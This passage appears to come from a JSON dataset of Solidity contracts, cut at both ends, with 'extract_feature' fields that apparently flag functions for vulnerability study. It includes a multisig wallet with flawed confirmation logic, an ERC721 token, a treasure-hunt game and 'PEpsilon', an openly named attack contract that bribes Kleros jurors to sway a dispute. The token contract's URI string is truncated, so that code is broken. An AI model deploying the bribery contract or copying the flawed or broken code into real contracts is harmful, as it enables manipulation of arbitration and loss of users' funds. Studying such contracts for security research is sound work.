  "content": "pragma solidity ^0.4.24;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract multiowned {\n struct PendingState {\n uint yetNeeded;\n uint ownersDone;\n uint index;\n }\n event Confirmation(address owner, bytes32 operation);\n event Revoke(address owner, bytes32 operation);\n event OwnerChanged(address oldOwner, address newOwner);\n event OwnerAdded(address newOwner);\n event OwnerRemoved(address oldOwner);\n event RequirementChanged(uint newRequirement);\n modifier onlyowner {\n if (isOwner(msg.sender))\n _;\n }\n modifier onlymanyowners(bytes32 _operation) {\n if (confirmAndCheck(_operation))\n _;\n }\n constructor(address[] _owners, uint _required) public {\n m_numOwners = _owners.length;\n for (uint i = 0; i < _owners.length; ++i)\n {\n m_owners[1 + i] = uint(_owners[i]);\n m_ownerIndex[uint(_owners[i])] = 1 + i;\n }\n m_required = _required;\n }\n function revoke(bytes32 _operation) external {\n uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n if (ownerIndex == 0) return;\n uint ownerIndexBit = 2**ownerIndex;\n PendingState storage pending = m_pending[_operation];\n if (pending.ownersDone & ownerIndexBit > 0) {\n pending.yetNeeded++;\n pending.ownersDone -= ownerIndexBit;\n emit Revoke(msg.sender, _operation);\n }\n }\n function changeOwner(address _from, address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n if (isOwner(_to)) return;\n uint ownerIndex = m_ownerIndex[uint(_from)];\n if (ownerIndex == 0) return;\n clearPending();\n m_owners[ownerIndex] = uint(_to);\n m_ownerIndex[uint(_from)] = 0;\n m_ownerIndex[uint(_to)] = ownerIndex;\n emit OwnerChanged(_from, _to);\n }\n function addOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n if (isOwner(_owner)) return;\n clearPending();\n if (m_numOwners >= c_maxOwners)\n reorganizeOwners();\n if (m_numOwners >= c_maxOwners)\n return;\n m_numOwners++;\n m_owners[m_numOwners] = uint(_owner);\n m_ownerIndex[uint(_owner)] = m_numOwners;\n emit OwnerAdded(_owner);\n }\n function removeOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n uint ownerIndex = m_ownerIndex[uint(_owner)];\n if (ownerIndex == 0) return;\n if (m_required > m_numOwners - 1) return;\n m_owners[ownerIndex] = 0;\n m_ownerIndex[uint(_owner)] = 0;\n clearPending();\n reorganizeOwners();\n emit OwnerRemoved(_owner);\n }\n function changeRequirement(uint _newRequired) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n if (_newRequired > m_numOwners) return;\n m_required = _newRequired;\n clearPending();\n emit RequirementChanged(_newRequired);\n }\n function isOwner(address _addr) public view returns (bool) {\n return m_ownerIndex[uint(_addr)] > 0;\n }\n function hasConfirmed(bytes32 _operation, address _owner) public view returns (bool) {\n PendingState storage pending = m_pending[_operation];\n uint ownerIndex = m_ownerIndex[uint(_owner)];\n if (ownerIndex == 0) return false;\n uint ownerIndexBit = 2**ownerIndex;\n if (pending.ownersDone & ownerIndexBit == 0) {\n return false;\n } else {\n return true;\n }\n }\n function confirmAndCheck(bytes32 _operation) internal returns (bool) {\n uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n if (ownerIndex == 0) return;\n PendingState storage pending = m_pending[_operation];\n if (pending.yetNeeded == 0) {\n pending.yetNeeded = m_required;\n pending.ownersDone = 0;\n pending.index = m_pendingIndex.length++;\n m_pendingIndex[pending.index] = _operation;\n }\n uint ownerIndexBit = 2**ownerIndex;\n if (pending.ownersDone & ownerIndexBit == 0) {\n emit Confirmation(msg.sender, _operation);\n if (pending.yetNeeded <= 1) {\n delete m_pendingIndex[m_pending[_operation].index];\n delete m_pending[_operation];\n return true;\n }\n else\n {\n pending.yetNeeded--;\n pending.ownersDone |= ownerIndexBit;\n }\n }\n }\n function reorganizeOwners() private returns (bool) {\n uint free = 1;\n while (free < m_numOwners)\n {\n while (free < m_numOwners && m_owners[free] != 0) free++;\n while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\n if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)\n {\n m_owners[free] = m_owners[m_numOwners];\n m_ownerIndex[m_owners[free]] = free;\n m_owners[m_numOwners] = 0;\n }\n }\n }\n function clearPending() internal {\n uint length = m_pendingIndex.length;\n for (uint i = 0; i < length; ++i) {\n if (m_pendingIndex[i] != 0) {\n delete m_pending[m_pendingIndex[i]];\n }\n }\n delete m_pendingIndex;\n }\n uint public m_required;\n uint public m_numOwners;\n uint[256] m_owners;\n uint constant c_maxOwners = 250;\n mapping(uint => uint) m_ownerIndex;\n mapping(bytes32 => PendingState) m_pending;\n bytes32[] m_pendingIndex;\n}\ncontract daylimit is multiowned {\n modifier limitedDaily(uint _value) {\n if (underLimit(_value))\n _;\n }\n constructor(uint _limit) public {\n m_dailyLimit = _limit;\n m_lastDay = today();\n }\n function setDailyLimit(uint _newLimit) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n m_dailyLimit = _newLimit;\n }\n function resetSpentToday() onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n m_spentToday = 0;\n }\n function underLimit(uint _value) internal onlyowner returns (bool) {\n if (today() > m_lastDay) {\n m_spentToday = 0;\n m_lastDay = today();\n }\n if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\n m_spentToday += _value;\n return true;\n }\n return false;\n }\n function today() private view returns (uint) { return block.timestamp / 1 days; }\n uint public m_dailyLimit;\n uint public m_spentToday;\n uint public m_lastDay;\n}\ncontract multisig {\n event Deposit(address from, uint value);\n event SingleTransact(address owner, uint value, address to);\n event MultiTransact(address owner, bytes32 operation, uint value, address to);\n event ConfirmationERC20Needed(bytes32 operation, address initiator, uint value, address to, ERC20Basic token);\n event ConfirmationETHNeeded(bytes32 operation, address initiator, uint value, address to);\n function changeOwner(address _from, address _to) external;\n}\ncontract Wallet is multisig, multiowned, daylimit {\n uint public version = 4;\n struct Transaction {\n address to;\n uint value;\n address token;\n }\n ERC20Basic public erc20;\n constructor(address[] _owners, uint _required, uint _daylimit, address _erc20)\n multiowned(_owners, _required) daylimit(_daylimit) public {\n erc20 = ERC20Basic(_erc20);\n }\n function changeERC20(address _erc20) onlymanyowners(keccak256(abi.encodePacked(msg.data))) public {\n erc20 = ERC20Basic(_erc20);\n }\n function kill(address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n selfdestruct(_to);\n }\n function() public payable {\n if (msg.value > 0)\n emit Deposit(msg.sender, msg.value);\n }\n function transferETH(address _to, uint _value) external onlyowner returns (bytes32 _r) {\n if (underLimit(_value)) {\n emit SingleTransact(msg.sender, _value, _to);\n _to.transfer(_value);\n return 0;\n }\n _r = keccak256(abi.encodePacked(msg.data, block.number));\n if (!confirmETH(_r) && m_txs[_r].to == 0) {\n m_txs[_r].to = _to;\n m_txs[_r].value = _value;\n emit ConfirmationETHNeeded(_r, msg.sender, _value, _to);\n }\n }\n function confirmETH(bytes32 _h) onlymanyowners(_h) public returns (bool) {\n if (m_txs[_h].to != 0) {\n m_txs[_h].to.transfer(m_txs[_h].value);\n emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);\n delete m_txs[_h];\n return true;\n }\n }\n function transferERC20(address _to, uint _value) external onlyowner returns (bytes32 _r) {\n if (underLimit(_value)) {\n emit SingleTransact(msg.sender, _value, _to);\n erc20.transfer(_to, _value);\n return 0;\n }\n _r = keccak256(abi.encodePacked(msg.data, block.number));\n if (!confirmERC20(_r) && m_txs[_r].to == 0) {\n m_txs[_r].to = _to;\n m_txs[_r].value = _value;\n m_txs[_r].token = erc20;\n emit ConfirmationERC20Needed(_r, msg.sender, _value, _to, erc20);\n }\n }\n function confirmERC20(bytes32 _h) onlymanyowners(_h) public returns (bool) {\n if (m_txs[_h].to != 0) {\n ERC20Basic token = ERC20Basic(m_txs[_h].token);\n token.transfer(m_txs[_h].to, m_txs[_h].value);\n emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);\n delete m_txs[_h];\n return true;\n }\n }\n function clearPending() internal {\n uint length = m_pendingIndex.length;\n for (uint i = 0; i < length; ++i)\n delete m_txs[m_pendingIndex[i]];\n super.clearPending();\n }\n mapping (bytes32 => Transaction) m_txs;\n}",
  "extract_feature": [
    "function today() private view returns (uint) { return block.timestamp / 1 days; }\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\n}",
    "function transferETH(address _to, uint _value) external onlyowner returns (bytes32 _r) {\nif (underLimit(_value)) {\nemit SingleTransact(msg.sender, _value, _to);\n_to.transfer(_value);\nreturn 0;\n}\n_r = keccak256(abi.encodePacked(msg.data, block.number));\nif (!confirmETH(_r) && m_txs[_r].to == 0) {\nm_txs[_r].to = _to;\nm_txs[_r].value = _value;\nemit ConfirmationETHNeeded(_r, msg.sender, _value, _to);\n}\n}",
    "function transferERC20(address _to, uint _value) external onlyowner returns (bytes32 _r) {\nif (underLimit(_value)) {\nemit SingleTransact(msg.sender, _value, _to);\nerc20.transfer(_to, _value);\nreturn 0;\n}\n_r = keccak256(abi.encodePacked(msg.data, block.number));\nif (!confirmERC20(_r) && m_txs[_r].to == 0) {\nm_txs[_r].to = _to;\nm_txs[_r].value = _value;\nm_txs[_r].token = erc20;\nemit ConfirmationERC20Needed(_r, msg.sender, _value, _to, erc20);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b49"
  },
  "filename": "2410.sol",
  "content": "pragma solidity ^0.4.24;\ninterface ERC165 {\n function supportsInterface(bytes4 _interfaceId)\n external\n view\n returns (bool);\n}\ncontract SupportsInterfaceWithLookup is ERC165 {\n bytes4 public constant InterfaceId_ERC165 = 0x01ffc9a7;\n mapping(bytes4 => bool) internal supportedInterfaces;\n constructor()\n public\n {\n _registerInterface(InterfaceId_ERC165);\n }\n function supportsInterface(bytes4 _interfaceId)\n external\n view\n returns (bool)\n {\n return supportedInterfaces[_interfaceId];\n }\n function _registerInterface(bytes4 _interfaceId)\n internal\n {\n require(_interfaceId != 0xffffffff);\n supportedInterfaces[_interfaceId] = true;\n }\n}\ncontract ERC721Basic is ERC165 {\n bytes4 internal constant InterfaceId_ERC721 = 0x80ac58cd;\n bytes4 internal constant InterfaceId_ERC721Exists = 0x4f558e79;\n bytes4 internal constant InterfaceId_ERC721Enumerable = 0x780e9d63;\n bytes4 internal constant InterfaceId_ERC721Metadata = 0x5b5e139f;\n event Transfer(\n address indexed _from,\n address indexed _to,\n uint256 indexed _tokenId\n );\n event Approval(\n address indexed _owner,\n address indexed _approved,\n uint256 indexed _tokenId\n );\n event ApprovalForAll(\n address indexed _owner,\n address indexed _operator,\n bool _approved\n );\n function balanceOf(address _owner) public view returns (uint256 _balance);\n function ownerOf(uint256 _tokenId) public view returns (address _owner);\n function exists(uint256 _tokenId) public view returns (bool _exists);\n function approve(address _to, uint256 _tokenId) public;\n function getApproved(uint256 _tokenId)\n public view returns (address _operator);\n function setApprovalForAll(address _operator, bool _approved) public;\n function isApprovedForAll(address _owner, address _operator)\n public view returns (bool);\n function transferFrom(address _from, address _to, uint256 _tokenId) public;\n function safeTransferFrom(address _from, address _to, uint256 _tokenId)\n public;\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n public;\n}\ncontract ERC721Enumerable is ERC721Basic {\n function totalSupply() public view returns (uint256);\n function tokenOfOwnerByIndex(\n address _owner,\n uint256 _index\n )\n public\n view\n returns (uint256 _tokenId);\n function tokenByIndex(uint256 _index) public view returns (uint256);\n}\ncontract ERC721Metadata is ERC721Basic {\n function name() external view returns (string _name);\n function symbol() external view returns (string _symbol);\n function tokenURI(uint256 _tokenId) public view returns (string);\n}\ncontract ERC721 is ERC721Basic, ERC721Enumerable, ERC721Metadata {\n}\ncontract ERC721Receiver {\n bytes4 internal constant ERC721_RECEIVED = 0x150b7a02;\n function onERC721Received(\n address _operator,\n address _from,\n uint256 _tokenId,\n bytes _data\n )\n public\n returns(bytes4);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract ERC721BasicToken is SupportsInterfaceWithLookup, ERC721Basic {\n using SafeMath for uint256;\n using AddressUtils for address;\n bytes4 private constant ERC721_RECEIVED = 0x150b7a02;\n mapping (uint256 => address) internal tokenOwner;\n mapping (uint256 => address) internal tokenApprovals;\n mapping (address => uint256) internal ownedTokensCount;\n mapping (address => mapping (address => bool)) internal operatorApprovals;\n constructor()\n public\n {\n _registerInterface(InterfaceId_ERC721);\n _registerInterface(InterfaceId_ERC721Exists);\n }\n function balanceOf(address _owner) public view returns (uint256) {\n require(_owner != address(0));\n return ownedTokensCount[_owner];\n }\n function ownerOf(uint256 _tokenId) public view returns (address) {\n address owner = tokenOwner[_tokenId];\n require(owner != address(0));\n return owner;\n }\n function exists(uint256 _tokenId) public view returns (bool) {\n address owner = tokenOwner[_tokenId];\n return owner != address(0);\n }\n function approve(address _to, uint256 _tokenId) public {\n address owner = ownerOf(_tokenId);\n require(_to != owner);\n require(msg.sender == owner || isApprovedForAll(owner, msg.sender));\n tokenApprovals[_tokenId] = _to;\n emit Approval(owner, _to, _tokenId);\n }\n function getApproved(uint256 _tokenId) public view returns (address) {\n return tokenApprovals[_tokenId];\n }\n function setApprovalForAll(address _to, bool _approved) public {\n require(_to != msg.sender);\n operatorApprovals[msg.sender][_to] = _approved;\n emit ApprovalForAll(msg.sender, _to, _approved);\n }\n function isApprovedForAll(\n address _owner,\n address _operator\n )\n public\n view\n returns (bool)\n {\n return operatorApprovals[_owner][_operator];\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n public\n {\n require(isApprovedOrOwner(msg.sender, _tokenId));\n require(_from != address(0));\n require(_to != address(0));\n clearApproval(_from, _tokenId);\n removeTokenFrom(_from, _tokenId);\n addTokenTo(_to, _tokenId);\n emit Transfer(_from, _to, _tokenId);\n }\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n public\n {\n safeTransferFrom(_from, _to, _tokenId, \"\");\n }\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n public\n {\n transferFrom(_from, _to, _tokenId);\n require(checkAndCallSafeTransfer(_from, _to, _tokenId, _data));\n }\n function isApprovedOrOwner(\n address _spender,\n uint256 _tokenId\n )\n internal\n view\n returns (bool)\n {\n address owner = ownerOf(_tokenId);\n return (\n _spender == owner ||\n getApproved(_tokenId) == _spender ||\n isApprovedForAll(owner, _spender)\n );\n }\n function _mint(address _to, uint256 _tokenId) internal {\n require(_to != address(0));\n addTokenTo(_to, _tokenId);\n emit Transfer(address(0), _to, _tokenId);\n }\n function _burn(address _owner, uint256 _tokenId) internal {\n clearApproval(_owner, _tokenId);\n removeTokenFrom(_owner, _tokenId);\n emit Transfer(_owner, address(0), _tokenId);\n }\n function clearApproval(address _owner, uint256 _tokenId) internal {\n require(ownerOf(_tokenId) == _owner);\n if (tokenApprovals[_tokenId] != address(0)) {\n tokenApprovals[_tokenId] = address(0);\n }\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n require(tokenOwner[_tokenId] == address(0));\n tokenOwner[_tokenId] = _to;\n ownedTokensCount[_to] = ownedTokensCount[_to].add(1);\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n require(ownerOf(_tokenId) == _from);\n ownedTokensCount[_from] = ownedTokensCount[_from].sub(1);\n tokenOwner[_tokenId] = address(0);\n }\n function checkAndCallSafeTransfer(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n internal\n returns (bool)\n {\n if (!_to.isContract()) {\n return true;\n }\n bytes4 retval = ERC721Receiver(_to).onERC721Received(\n msg.sender, _from, _tokenId, _data);\n return (retval == ERC721_RECEIVED);\n }\n}\ncontract ERC721Token is SupportsInterfaceWithLookup, ERC721BasicToken, ERC721 {\n string internal name_;\n string internal symbol_;\n mapping(address => uint256[]) internal ownedTokens;\n mapping(uint256 => uint256) internal ownedTokensIndex;\n uint256[] internal allTokens;\n mapping(uint256 => uint256) internal allTokensIndex;\n mapping(uint256 => string) internal tokenURIs;\n constructor(string _name, string _symbol) public {\n name_ = _name;\n symbol_ = _symbol;\n _registerInterface(InterfaceId_ERC721Enumerable);\n _registerInterface(InterfaceId_ERC721Metadata);\n }\n function name() external view returns (string) {\n return name_;\n }\n function symbol() external view returns (string) {\n return symbol_;\n }\n function tokenURI(uint256 _tokenId) public view returns (string) {\n require(exists(_tokenId));\n return tokenURIs[_tokenId];\n }\n function tokenOfOwnerByIndex(\n address _owner,\n uint256 _index\n )\n public\n view\n returns (uint256)\n {\n require(_index < balanceOf(_owner));\n return ownedTokens[_owner][_index];\n }\n function totalSupply() public view returns (uint256) {\n return allTokens.length;\n }\n function tokenByIndex(uint256 _index) public view returns (uint256) {\n require(_index < totalSupply());\n return allTokens[_index];\n }\n function _setTokenURI(uint256 _tokenId, string _uri) internal {\n require(exists(_tokenId));\n tokenURIs[_tokenId] = _uri;\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n super.addTokenTo(_to, _tokenId);\n uint256 length = ownedTokens[_to].length;\n ownedTokens[_to].push(_tokenId);\n ownedTokensIndex[_tokenId] = length;\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n super.removeTokenFrom(_from, _tokenId);\n uint256 tokenIndex = ownedTokensIndex[_tokenId];\n uint256 lastTokenIndex = ownedTokens[_from].length.sub(1);\n uint256 lastToken = ownedTokens[_from][lastTokenIndex];\n ownedTokens[_from][tokenIndex] = lastToken;\n ownedTokens[_from].length--;\n ownedTokensIndex[_tokenId] = 0;\n ownedTokensIndex[lastToken] = tokenIndex;\n }\n function _mint(address _to, uint256 _tokenId) internal {\n super._mint(_to, _tokenId);\n allTokensIndex[_tokenId] = allTokens.length;\n allTokens.push(_tokenId);\n }\n function _burn(address _owner, uint256 _tokenId) internal {\n super._burn(_owner, _tokenId);\n if (bytes(tokenURIs[_tokenId]).length != 0) {\n delete tokenURIs[_tokenId];\n }\n uint256 tokenIndex = allTokensIndex[_tokenId];\n uint256 lastTokenIndex = allTokens.length.sub(1);\n uint256 lastToken = allTokens[lastTokenIndex];\n allTokens[tokenIndex] = lastToken;\n allTokens[lastTokenIndex] = 0;\n allTokens.length--;\n allTokensIndex[_tokenId] = 0;\n allTokensIndex[lastToken] = tokenIndex;\n }\n}\ncontract lettertoken205 is ERC721Token {\n constructor() public ERC721Token(\"lettertoken205\",\"lettertoken205\") { }\n struct Token{\n uint8 data1;\n uint8 data2;\n uint64 data3;\n uint64 data4;\n uint64 startBlock;\n }\n Token[] private tokens;\n function create(uint8 data1, uint8 data2,uint64 data3, uint64 data4) public returns (uint256 _tokenId) {\n string memory tokenUri = createTokenUri(data1,data2,data3,data4);\n Token memory _newToken = Token({\n data1: data1,\n data2: data2,\n data3: data3,\n data4: data4,\n startBlock: uint64(block.number)\n });\n _tokenId = tokens.push(_newToken) - 1;\n _mint(msg.sender,_tokenId);\n _setTokenURI(_tokenId, tokenUri);\n tokenUri=strConcat(tokenUri,\"-\");\n string memory tokenIdb=uint2str(_tokenId);\n tokenUri=strConcat(tokenUri, tokenIdb);\n emit Create(_tokenId,msg.sender,data1,data2,data3,data4,_newToken.startBlock,tokenUri);\n return _tokenId;\n }\n event Create(\n uint _id,\n address indexed _owner,\n uint8 _data1,\n uint8 _data2,\n uint64 _data3,\n uint64 _data4,\n uint64 _startBlock,\n string _uri\n );\n function get(uint256 _id) public view returns (address owner,uint8 data1,uint8 data2,uint64 data3,uint64 data4,uint64 startBlock) {\n return (\n tokenOwner[_id],\n tokens[_id].data1,\n tokens[_id].data2,\n tokens[_id].data3,\n tokens[_id].data4,\n tokens[_id].startBlock\n );\n }\n function tokensOfOwner(address _owner) public view returns(uint256[]) {\n return ownedTokens[_owner];\n }\n function createTokenUri(uint8 data1,uint8 data2,uint64 data3,uint64 data4) internal pure returns (string){\n string memory uri = \"https:\n uri = appendUint8ToString(uri,data1);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,data2);\n uri = strConcat(uri,\"-\");\n string memory data3b=uint2str(data3);\n uri = strConcat(uri,data3b);\n uri = strConcat(uri,\"-\");\n string memory data4b=uint2str(data4);\n uri = strConcat(uri,data4b);\n uri = strConcat(uri,\".png\");\n return uri;\n }\nfunction uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint length;\n while (j != 0){\n length++;\n j /= 10;\n }\n bytes memory bstr = new bytes(length);\n uint k = length - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n}\n function appendUint8ToString(string inStr, uint8 v) internal pure returns (string str) {\n uint maxlength = 100;\n bytes memory reversed = new bytes(maxlength);\n uint i = 0;\n while (v != 0) {\n uint remainder = v % 10;\n v = v / 10;\n reversed[i++] = byte(48 + remainder);\n }\n bytes memory inStrb = bytes(inStr);\n bytes memory s = new bytes(inStrb.length + i);\n uint j;\n for (j = 0; j < inStrb.length; j++) {\n s[j] = inStrb[j];\n }\n for (j = 0; j < i; j++) {\n s[j + inStrb.length] = reversed[i - 1 - j];\n }\n str = string(s);\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n string memory ab = new string(_ba.length + _bb.length);\n bytes memory bab = bytes(ab);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) bab[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) bab[k++] = _bb[i];\n return string(bab);\n }\n}",
  "extract_feature": [
    "function create(uint8 data1, uint8 data2,uint64 data3, uint64 data4) public returns (uint256 _tokenId) {\nstring memory tokenUri = createTokenUri(data1,data2,data3,data4);\nToken memory _newToken = Token({\ndata1: data1,\ndata2: data2,\ndata3: data3,\ndata4: data4,\nstartBlock: uint64(block.number)\n});\n_tokenId = tokens.push(_newToken) - 1;\n_mint(msg.sender,_tokenId);\n_setTokenURI(_tokenId, tokenUri);\ntokenUri=strConcat(tokenUri,\"-\");\nstring memory tokenIdb=uint2str(_tokenId);\ntokenUri=strConcat(tokenUri, tokenIdb);\nemit Create(_tokenId,msg.sender,data1,data2,data3,data4,_newToken.startBlock,tokenUri);\nreturn _tokenId;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b4a"
  },
  "filename": "2440.sol",
  "content": "pragma solidity 0.4.24;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract TreasureHunt is Ownable {\n uint public cost;\n uint public pot;\n uint public ownersBalance;\n uint public timeOfWin;\n address public winner;\n bool public grace;\n uint[] public locations;\n struct KeyLog {\n uint encryptKey;\n uint block;\n }\n mapping(address => mapping(uint => KeyLog)) public hunters;\n event WonEvent(address winner);\n function locationsLength() public view returns (uint) {\n return locations.length;\n }\n function setAllLocations(uint[] _locations) onlyOwner public {\n locations = _locations;\n }\n function setLocation(uint index, uint _location) onlyOwner public {\n require(index < locations.length);\n locations[index] = _location;\n }\n function addLocation(uint _location) onlyOwner public {\n locations.push(_location);\n }\n function setCost(uint _cost) onlyOwner public {\n cost = _cost;\n }\n function submitLocation(uint encryptKey, uint8 locationNumber) public payable {\n require(encryptKey != 0);\n require(locationNumber < locations.length);\n if (!grace) {\n require(msg.value >= cost);\n uint contribution = cost - cost / 10;\n ownersBalance += cost - contribution;\n pot += contribution;\n }\n hunters[msg.sender][locationNumber] = KeyLog(encryptKey, block.number);\n }\n function checkWin(uint[] decryptKeys) public {\n require(!grace);\n require(decryptKeys.length == locations.length);\n uint lastBlock = 0;\n bool won = true;\n for (uint i; i < locations.length; i++) {\n require(hunters[msg.sender][i].block > lastBlock);\n lastBlock = hunters[msg.sender][i].block;\n if (locations[i] != 0) {\n uint storedVal = uint(keccak256(abi.encodePacked(hunters[msg.sender][i].encryptKey ^ decryptKeys[i])));\n won = won && (locations[i] == storedVal);\n }\n }\n require(won);\n if (won) {\n timeOfWin = now;\n winner = msg.sender;\n grace = true;\n emit WonEvent(winner);\n }\n }\n function increasePot() public payable {\n pot += msg.value;\n }\n function() public payable {\n increasePot();\n }\n function resetWinner() public {\n require(grace);\n require(now > timeOfWin + 30 days);\n grace = false;\n winner = 0;\n ownersBalance = 0;\n pot = address(this).balance;\n }\n function withdraw() public returns (bool) {\n uint amount;\n if (msg.sender == owner) {\n amount = ownersBalance;\n ownersBalance = 0;\n } else if (msg.sender == winner) {\n amount = pot;\n pot = 0;\n }\n msg.sender.transfer(amount);\n }\n function kill() onlyOwner public {\n selfdestruct(owner);\n }\n}",
  "extract_feature": [
    "function submitLocation(uint encryptKey, uint8 locationNumber) public payable {\nrequire(encryptKey != 0);\nrequire(locationNumber < locations.length);\nif (!grace) {\nrequire(msg.value >= cost);\nuint contribution = cost - cost / 10;\nownersBalance += cost - contribution;\npot += contribution;\n}\nhunters[msg.sender][locationNumber] = KeyLog(encryptKey, block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b4b"
  },
  "filename": "246.sol",
  "content": "pragma solidity ^0.4.24;\ncontract PEpsilon {\n Pinakion public pinakion;\n Kleros public court;\n uint public balance;\n uint public disputeID;\n uint public desiredOutcome;\n uint public epsilon;\n bool public settled;\n uint public maxAppeals;\n mapping (address => uint) public withdraw;\n address public attacker;\n uint public remainingWithdraw;\n modifier onlyBy(address _account) {require(msg.sender == _account); _;}\n event AmountShift(uint val, uint epsilon ,address juror);\n event Log(uint val, address addr, string message);\n constructor(Pinakion _pinakion, Kleros _kleros, uint _disputeID, uint _desiredOutcome, uint _epsilon, uint _maxAppeals) public {\n pinakion = _pinakion;\n court = _kleros;\n disputeID = _disputeID;\n desiredOutcome = _desiredOutcome;\n epsilon = _epsilon;\n attacker = msg.sender;\n maxAppeals = _maxAppeals;\n }\n function receiveApproval(address _from, uint _amount, address, bytes) public onlyBy(pinakion) {\n require(pinakion.transferFrom(_from, this, _amount));\n balance += _amount;\n }\n function withdrawJuror() {\n withdrawSelect(msg.sender);\n }\n function withdrawSelect(address _juror) {\n uint amount = withdraw[_juror];\n withdraw[_juror] = 0;\n balance = sub(balance, amount);\n remainingWithdraw = sub(remainingWithdraw, amount);\n require(pinakion.transfer(_juror, amount));\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function withdrawAttacker(){\n require(settled);\n if (balance > remainingWithdraw) {\n uint amount = balance - remainingWithdraw;\n balance = remainingWithdraw;\n require(pinakion.transfer(attacker, amount));\n }\n }\n function settle() public {\n require(court.disputeStatus(disputeID) == Arbitrator.DisputeStatus.Solved);\n require(!settled);\n settled = true;\n var (, , appeals, choices, , , ,) = court.disputes(disputeID);\n if (court.currentRuling(disputeID) != desiredOutcome){\n uint amountShift = court.getStakePerDraw();\n uint winningChoice = court.getWinningChoice(disputeID, appeals);\n for (uint i=0; i <= (appeals > maxAppeals ? maxAppeals : appeals); i++){\n if (winningChoice != 0){\n uint votesLen = 0;\n for (uint c = 0; c <= choices; c++) {\n votesLen += court.getVoteCount(disputeID, i, c);\n }\n emit Log(amountShift, 0x0 ,\"stakePerDraw\");\n emit Log(votesLen, 0x0, \"votesLen\");\n uint totalToRedistribute = 0;\n uint nbCoherent = 0;\n for (uint j=0; j < votesLen; j++){\n uint voteRuling = court.getVoteRuling(disputeID, i, j);\n address voteAccount = court.getVoteAccount(disputeID, i, j);\n emit Log(voteRuling, voteAccount, \"voted\");\n if (voteRuling != winningChoice){\n totalToRedistribute += amountShift;\n if (voteRuling == desiredOutcome){\n withdraw[voteAccount] += amountShift + epsilon;\n remainingWithdraw += amountShift + epsilon;\n emit AmountShift(amountShift, epsilon, voteAccount);\n }\n } else {\n nbCoherent++;\n }\n }\n uint toRedistribute = (totalToRedistribute - amountShift) / (nbCoherent + 1);\n for (j = 0; j < votesLen; j++){\n voteRuling = court.getVoteRuling(disputeID, i, j);\n voteAccount = court.getVoteAccount(disputeID, i, j);\n if (voteRuling == desiredOutcome){\n withdraw[voteAccount] += toRedistribute;\n remainingWithdraw += toRedistribute;\n emit AmountShift(toRedistribute, 0, voteAccount);\n }\n }\n }\n }\n }\n }\n}\npragma solidity ^0.4.24;\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract Pinakion is Controlled {\n string public 